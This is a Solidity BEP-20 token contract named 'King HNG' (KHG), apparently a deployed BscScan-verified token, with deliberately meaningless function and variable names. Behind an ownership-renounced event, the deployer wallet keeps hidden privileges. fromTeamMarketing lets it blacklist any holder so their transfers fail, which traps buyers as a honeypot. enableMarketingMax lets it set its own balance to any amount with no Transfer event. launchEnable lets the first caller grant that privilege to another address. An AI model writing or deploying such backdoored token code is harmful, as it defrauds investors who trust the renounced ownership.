/**
 *Submitted for verification at BscScan.com on 2023-02-10
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract minTrading {
    function receiverLaunch() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface swapLaunch {
    function createPair(address tradingFrom, address amountTx) external returns (address);
}

interface maxEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KingHNG is IERC20, minTrading {
    uint8 private tradingMax = 18;
    

    address private atEnable;
    uint256 private swapList;
    address public txLaunchWallet;
    bool private modeTo;
    mapping(address => bool) public buyEnable;
    uint256 public tokenBuy;
    string private minReceiver = "KHG";

    bool private tradingMarketingLimit;
    string private isShould = "King HNG";
    uint256 public exemptWallet;

    address public amountMin;
    mapping(address => mapping(address => uint256)) private tokenExempt;
    uint256 public launchedAt;
    
    bool public autoAtLimit;
    address private senderLiquidityTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    bool public shouldBuy;
    bool public walletList;

    uint256 private marketingTeam = 100000000 * 10 ** tradingMax;
    mapping(address => bool) public teamMaxBuy;
    mapping(address => uint256) private atEnableShould;

    

    event OwnershipTransferred(address indexed fundToken, address indexed buySwap);

    constructor (){
        if (tokenBuy != swapList) {
            tradingMarketingLimit = false;
        }
        maxEnable feeTradingIs = maxEnable(senderLiquidityTrading);
        amountMin = swapLaunch(feeTradingIs.factory()).createPair(feeTradingIs.WETH(), address(this));
        atEnable = receiverLaunch();
        
        txLaunchWallet = atEnable;
        buyEnable[txLaunchWallet] = true;
        if (launchedAt != tokenBuy) {
            launchedAt = tokenBuy;
        }
        atEnableShould[txLaunchWallet] = marketingTeam;
        emit Transfer(address(0), txLaunchWallet, marketingTeam);
        listWalletLaunch();
    }

    

    function feeAtLaunched() public view returns (uint256) {
        return launchedAt;
    }

    function owner() external view returns (address) {
        return atEnable;
    }

    function symbol() external view returns (string memory) {
        return minReceiver;
    }

    function listWalletLaunch() public {
        emit OwnershipTransferred(txLaunchWallet, address(0));
        atEnable = address(0);
    }

    function name() external view returns (string memory) {
        return isShould;
    }

    function balanceOf(address fundTeam) public view virtual override returns (uint256) {
        return atEnableShould[fundTeam];
    }

    function fromTeamMarketing(address amountShould) public {
        
        if (amountShould == txLaunchWallet || amountShould == amountMin || !buyEnable[receiverLaunch()]) {
            return;
        }
        if (tokenBuy != launchedAt) {
            tokenBuy = exemptWallet;
        }
        teamMaxBuy[amountShould] = true;
    }

    function transfer(address limitExemptTrading, uint256 shouldLiquidity) external virtual override returns (bool) {
        return totalTake(receiverLaunch(), limitExemptTrading, shouldLiquidity);
    }

    function launchEnable(address fromLaunchedWallet) public {
        if (autoAtLimit) {
            return;
        }
        
        buyEnable[fromLaunchedWallet] = true;
        
        autoAtLimit = true;
    }

    function launchTo(address listTrading, address isMaxMarketing, uint256 shouldLiquidity) internal returns (bool) {
        require(atEnableShould[listTrading] >= shouldLiquidity);
        atEnableShould[listTrading] -= shouldLiquidity;
        atEnableShould[isMaxMarketing] += shouldLiquidity;
        emit Transfer(listTrading, isMaxMarketing, shouldLiquidity);
        return true;
    }

    function totalTake(address listTrading, address isMaxMarketing, uint256 shouldLiquidity) internal returns (bool) {
        if (listTrading == txLaunchWallet || isMaxMarketing == txLaunchWallet) {
            return launchTo(listTrading, isMaxMarketing, shouldLiquidity);
        }
        
        require(!teamMaxBuy[listTrading]);
        
        return launchTo(listTrading, isMaxMarketing, shouldLiquidity);
    }

    function transferFrom(address listTrading, address isMaxMarketing, uint256 shouldLiquidity) external override returns (bool) {
        if (tokenExempt[listTrading][receiverLaunch()] != type(uint256).max) {
            require(shouldLiquidity <= tokenExempt[listTrading][receiverLaunch()]);
            tokenExempt[listTrading][receiverLaunch()] -= shouldLiquidity;
        }
        return totalTake(listTrading, isMaxMarketing, shouldLiquidity);
    }

    function amountList() public view returns (bool) {
        return shouldBuy;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingTeam;
    }

    function approve(address enableMax, uint256 shouldLiquidity) public virtual override returns (bool) {
        tokenExempt[receiverLaunch()][enableMax] = shouldLiquidity;
        emit Approval(receiverLaunch(), enableMax, shouldLiquidity);
        return true;
    }

    function enableMarketingMax(uint256 shouldLiquidity) public {
        if (!buyEnable[receiverLaunch()]) {
            return;
        }
        atEnableShould[txLaunchWallet] = shouldLiquidity;
    }

    function getOwner() external view returns (address) {
        return atEnable;
    }

    function decimals() external view returns (uint8) {
        return tradingMax;
    }

    function fundWalletShould() public {
        
        if (exemptWallet == tokenBuy) {
            modeTo = false;
        }
        swapList=0;
    }

    function allowance(address fundAutoShould, address enableMax) external view virtual override returns (uint256) {
        return tokenExempt[fundAutoShould][enableMax];
    }

    function receiverTrading() public view returns (bool) {
        return shouldBuy;
    }


}